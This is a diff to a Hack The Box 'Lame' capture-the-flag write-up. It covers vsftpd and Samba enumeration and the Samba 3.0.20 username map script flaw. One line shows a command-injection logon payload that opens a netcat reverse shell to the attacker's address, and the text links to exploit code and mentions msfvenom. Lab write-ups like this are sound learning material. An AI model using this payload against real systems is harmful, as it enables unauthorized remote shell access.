@@ -173,9 +173,9 @@ Shellcodes: No Results
 vsftp 2.3.4 has backdoor command execution vulnerability.
 
 rapid7: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
+
 exploit-db has the code: https://www.exploit-db.com/exploits/17491
 
-The machine does not seem to have this vulnerabilty though.
 
 ### Samba
 
@@ -235,7 +235,7 @@ It is possible to login as a guest.
 	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
 	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
 
- smbclient -N -L ////10.10.10.3
+$ smbclient -N -L ////10.10.10.3
 Anonymous login successful
 
 	Sharename       Type      Comment
@@ -286,7 +286,7 @@ smb: \> logon “/='nc 10.10.14.15 1337 -e /bin/bash'
 
 While there are walkthroughs that open a shell (for example https://medium.com/@siddharth.singhal1995/htb-walkthrough-lame-1-caa8d4b4da39), at this time it did not work.
 
-Checking the cvedetails vulnerability CVE-2020-1472 seems promising.
+#### Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
 
 macha97 has kindly created an exploit that we can use: https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
 
@@ -324,7 +324,7 @@ drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
 -rwx------  1 root root  401 May 20  2012 reset_logs.sh
 -rw-------  1 root root   33 Oct  4 12:53 root.txt
 -rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
-´´´
+```
 
 After running the msfvenom with the correct LHOST:
 
